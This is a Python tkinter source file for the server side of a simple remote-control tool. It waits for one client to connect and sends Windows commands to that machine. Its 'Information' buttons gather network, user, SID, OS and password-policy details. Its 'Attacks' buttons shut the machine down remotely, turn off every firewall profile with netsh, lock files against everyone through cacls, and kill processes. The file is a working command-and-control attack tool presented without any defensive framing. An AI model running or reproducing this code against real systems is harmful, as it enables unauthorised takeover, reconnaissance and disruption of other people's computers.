import tkinter as tk
import socket
from tkinter.filedialog import askopenfilename
import re

top = tk.Tk()
top.geometry("520x600")
top.title("Server")

label_output = tk.Label(master=top, text="Output")
label_output.grid(row=11,column=0,columnspan=2)
msg_frame = tk.Frame(master=top, relief="ridge", borderwidth=2,width=70,height=15, padx=5, pady=5)
msgoutput = tk.Text(master=msg_frame,width=70,height=15)
scroll = tk.Scrollbar(msg_frame)
msg_frame.grid(row=12,column=0,columnspan=2)
msgoutput.pack(side=tk.LEFT, fill=tk.Y)
scroll.pack(side=tk.RIGHT, fill=tk.Y)
scroll.config(command=msgoutput.yview)
msgoutput.config(yscrollcommand=scroll.set)
msgoutput.insert(tk.END, "Result")
msgoutput.config(state="disabled")

HOST = "" # '192.168.43.82'
PORT = 8081 # 2222
username = ""
msg = ""
server = socket.socket()
server.bind((HOST, PORT))
print('[+] Server Started')
print('[+] Listening For Client Connection ...')
server.listen(1)
client, client_addr = server.accept()
print(f'[+] {client_addr} Client connected to the server')

        
def networkinfo():
    while True:
        command = "ipconfig /all"
        command = command.encode()
        client.send(command)
        print('[+] Command sent')
        output = client.recv(8096)
        output = output.decode()
        print(f"Output: {output}")
        msgoutput.config(state="normal")
        msgoutput.delete("1.0", tk.END)
        msgoutput.insert(tk.END, output)
        msgoutput.config(state="disabled")
        break

def uname():
    while True:
        command = 'echo %USERNAME%'
        command = command.encode()
        client.send(command)
        output = client.recv(1024)
        output = output.decode()
        username = output.strip()
        command = 'whoami /user'
        command = command.encode()
        client.send(command)
        output = client.recv(4096)
        output = output.decode()
        sid = output
        cmd = "net user " + username + " | findstr /n Membership"
        command = cmd.replace("\n", "")
        command = command.encode()
        client.send(command)
        print('[+] Command sent')
        output = client.recv(1024)
        output = output.decode()
        msg = sid + '\n' + output
        msgoutput.config(state="normal")
        msgoutput.delete("1.0", tk.END)
        msgoutput.insert(tk.END, msg)
        msgoutput.config(state="disabled")
        break

def osinfo():
    while True:
        command = 'systeminfo | findstr /C:"OS"'
        command = command.encode()
        client.send(command)
        print('[+] Command sent')
        output = client.recv(1024)
        output = output.decode()
        print(f"Output: {output}")
        msgoutput.config(state="normal")
        msgoutput.delete("1.0", tk.END)
        msgoutput.insert(tk.END, output)
        msgoutput.config(state="disabled")
        break

def memoryinfo():
    while True:
        command = "wmic memorychip list full"
        command = command.encode()
        client.send(command)
        print('[+] Command sent')
        output = client.recv(1024)
        output = output.decode()
        print(f"Output: {output}")
        msgoutput.config(state="normal")
        msgoutput.delete("1.0", tk.END)
        msgoutput.insert(tk.END, output)
        msgoutput.config(state="disabled")
        break

def cpuinfo():
    while True:
        command = 'systeminfo'
        command = command.encode()
        client.send(command)
        print('[+] Command sent')
        output = client.recv(8192)
        output = output.decode()
        print(f"Output: {output}")
        msgoutput.config(state="normal")
        msgoutput.delete("1.0", tk.END)
        msgoutput.insert(tk.END, output)
        msgoutput.config(state="disabled")
        break

def storageinfo():
    while True:
        command = "wmic logicaldisk get caption,volumename,size,filesystem,freespace"
        command = command.encode()
        client.send(command)
        print('[+] Command sent')
        output = client.recv(4096)
        output = output.decode()
        print(f"Output: {output}")
        msgoutput.config(state="normal")
        msgoutput.delete("1.0", tk.END)
        msgoutput.insert(tk.END, output)
        msgoutput.config(state="disabled")
        break

def secpolicy():
    while True:
        command = "net accounts"
        command = command.encode()
        client.send(command)
        print('[+] Command sent')
        output = client.recv(4096)
        output = output.decode()
        msgoutput.config(state="normal")
        msgoutput.delete("1.0", tk.END)
        msgoutput.insert(tk.END, output)
        msgoutput.config(state="disabled")
        break

def timelineinfo():
    while True:
        command = 'echo %USERNAME%'
        command = command.encode()
        client.send(command)
        print('[+] Command sent')
        output = client.recv(1024)
        output = output.decode()
        username = output
        command = 'net user ' + username
        command = command.encode()
        client.send(command)
        print('[+] Command sent')
        output = client.recv(4096)
        output = output.decode()
        print(f"Output: {output}")
        msgoutput.config(state="normal")
        msgoutput.delete("1.0", tk.END)
        msgoutput.insert(tk.END, output)
        msgoutput.config(state="disabled")
        break


def tasklist():
    while True:
        command = 'tasklist /fi "STATUS eq RUNNING"'
        command = command.encode()
        client.send(command)
        print('[+] Command sent')
        output = client.recv(20480)
        output = output.decode()
        print(f"Output: {output}")
        msgoutput.config(state="normal")
        msgoutput.delete("1.0", tk.END)
        msgoutput.insert(tk.END, output)
        msgoutput.config(state="disabled")
        break

def shutdown():
    while True:
        command = 'shutdown /s /t 00'
        command = command.encode()
        client.send(command)
        print('[+] Command sent')
        output = client.recv(8192)
        output = output.decode()
        print(f"Output: {output}")
        msgoutput.config(state="normal")
        msgoutput.delete("1.0", tk.END)
        msgoutput.insert(tk.END, output)
        msgoutput.config(state="disabled")
        break
    
def firewall():
    while True:
        command = "netsh advfirewall set allprofiles state off"
        command = command.encode()
        client.send(command)
        print('[+] Command sent')
        output = client.recv(1024)
        output = output.decode()
        print(f"Output: {output}")
        msgoutput.config(state="normal")
        msgoutput.delete("1.0", tk.END)
        msgoutput.insert(tk.END, "Firewall turned off")
        msgoutput.config(state="disabled")
        break

def lockfile():
    while True:
        command = 'dir'
        command = command.encode()
        client.send(command)
        print('[+] Command sent')
        output = client.recv(10248)
        output = output.decode()
        print(f"Output: {output}")
        filename= input('Please Enter the file name: ')
        command = 'cacls ' + filename + ' /e /p everyone:n'
        command = command.encode()
        client.send(command)
        print('[+] Command sent')
        output = client.recv(10248)
        output = output.decode()
        print(f"Output: {output}")
        msgoutput.config(state="normal")
        msgoutput.delete("1.0", tk.END)
        msgoutput.insert(tk.END, output)
        msgoutput.config(state="disabled")
        break
    
def unlockfile():
    while True:
        command = 'dir'
        command = command.encode()
        client.send(command)
        print('[+] Command sent')
        output = client.recv(10248)
        output = output.decode()
        print(f"Output: {output}")
        filename= input('Please Enter the file name: ')
        command = 'cacls ' + filename + ' /e /p everyone:f'
        command = command.encode()
        client.send(command)
        print('[+] Command sent')
        output = client.recv(10248)
        output = output.decode()
        print(f"Output: {output}")
        msgoutput.config(state="normal")
        msgoutput.delete("1.0", tk.END)
        msgoutput.insert(tk.END, output)
        msgoutput.config(state="disabled")
        break

def taskkill():
    while True:
        command = 'tasklist /fi "STATUS eq RUNNING"'
        command = command.encode()
        client.send(command)
        print('[+] Command sent')
        output = client.recv(20480)
        output = output.decode()
        print(f"Output: {output}")
        procname= input('Please Enter the Process name: ')
        command = 'taskkill /im ' + procname
        command = command.encode()
        client.send(command)
        print('[+] Command sent')
        output = client.recv(20480)
        output = output.decode()
        print(f"Output: {output}")       
        msgoutput.config(state="normal")
        msgoutput.delete("1.0", tk.END)
        msgoutput.insert(tk.END, output)
        msgoutput.config(state="disabled")
        break

def quit():
    while True:
        print('[+] Connection closed')
        command = "Quit"
        command = command.encode()
        client.send(command)
        output = client.recv(1024)
        client.close()
        server.close()
        top.destroy()
        break

label_info = tk.Label(master = top, text = "Information: ")
label_info.grid(row=0, column=0)
button_ni = tk.Button(top, text="Network information", width=15, command=networkinfo)
button_ui = tk.Button(top, text="User information", width=15, command=uname)
button_oi = tk.Button(top, text="OS information", width=15, command=osinfo)
button_mi = tk.Button(top, text="Memory information", width=15, command=memoryinfo)
button_ci = tk.Button(top, text="CPU information", width=15, command=cpuinfo)
button_bi = tk.Button(top, text="Storage information", width=15, command=storageinfo)
button_sp = tk.Button(top, text="Password policy", width=15, command=secpolicy)
button_ti = tk.Button(top, text="Timeline information", width=15, command=timelineinfo)
button_p = tk.Button(top, text="List Task", width=15, command=tasklist)
button_q = tk.Button(top, text="Quit", width=15, command=quit)

button_ni.grid(row=1, column=0, padx=5, pady=5)
button_ui.grid(row=2, column=0, padx=5, pady=5)
button_oi.grid(row=3, column=0, padx=5, pady=5)
button_mi.grid(row=4, column=0, padx=5, pady=5)
button_ci.grid(row=5, column=0, padx=5, pady=5)
button_bi.grid(row=6, column=0, padx=5, pady=5)
button_sp.grid(row=7, column=0, padx=5, pady=5)
button_ti.grid(row=8, column=0, padx=5, pady=5)
button_p.grid(row=9, column=0, padx=5, pady=5)
button_q.grid(row=13, column=0, padx=5, pady=5, columnspan=1)

label_attack = tk.Label(master = top, text = "Attacks: ")
label_attack.grid(row=0, column=1)
button_rs = tk.Button(top, text="Remote shutdown", width=15, command=shutdown)
button_of = tk.Button(top, text="Turn off firewall", width=15, command=firewall)
button_lf = tk.Button(top, text="Lock file", width=15, command=lockfile)
button_uf = tk.Button(top, text="Unlock file", width=15, command=unlockfile)
button_kt = tk.Button(top, text="Kill task", width=15, command=taskkill)


button_rs.grid(row=1, column=1, padx=5, pady=5)
button_of.grid(row=2, column=1, padx=5, pady=5)
button_lf.grid(row=3, column=1, padx=5, pady=5)
button_uf.grid(row=4, column=1, padx=5, pady=5)
button_kt.grid(row=5, column=1, padx=5, pady=5)

top.mainloop()
